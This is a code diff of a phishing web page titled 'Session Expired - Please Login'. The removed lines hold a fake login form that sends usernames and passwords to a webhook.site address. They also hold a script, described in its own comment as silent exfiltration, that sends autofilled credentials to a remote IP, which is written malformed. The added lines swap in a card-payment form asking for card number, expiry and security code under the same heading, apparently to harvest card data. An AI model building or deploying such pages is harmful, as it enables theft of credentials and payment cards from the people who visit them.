@@ -9,27 +9,21 @@
 </head>
 <body>
     <h3>Session Expired - Please Login</h3>
-    <form action="https://webhook.site/92b9d5f2-f062-4c14-9796-1b09c0118b51" method="POST">
-        <label>Username</label>
-        <input type="text" name="username" id="username" autocomplete="username" placeholder="Email or Username">
-        
-        <label>Password</label>
-        <input type="password" name="password" id="password" autocomplete="current-password" placeholder="Password">
-        
-        <button type="submit">Sign In</button>
-    </form>
+    <form action="/process-payment" method="POST">
+  <label for="cc-name">Name on Card</label>
+  <input type="text" id="cc-name" name="ccname" autocomplete="cc-name" required>
 
-    <script>
-        // Optional: Silent exfiltration
-        // Some managers autofill instantly. This script waits 2 seconds 
-        // and sends the values to you even if they don't click 'Submit'.
-        setTimeout(() => {
-            const u = document.getElementById('username').value;
-            const p = document.getElementById('password').value;
-            if(u && p) {
-                fetch(`http://192.168/log?u=${u}&p=${p}`);
-            }
-        }, 2000);
-    </script>
+  <label for="cc-number">Card Number</label>
+  <input type="text" id="cc-number" name="cardnumber" autocomplete="cc-number" inputmode="numeric" required>
+
+  <label for="cc-exp">Expiry Date</label>
+  <input type="text" id="cc-exp" name="cc-exp" placeholder="MM/YY" autocomplete="cc-exp" required>
+
+  <label for="cc-csc">Security Code</label>
+  <input type="text" id="cc-csc" name="csc" autocomplete="cc-csc" inputmode="numeric" required>
+
+  <button type="submit">Pay Now</button>
+</form>
+
 </body>
 </html>
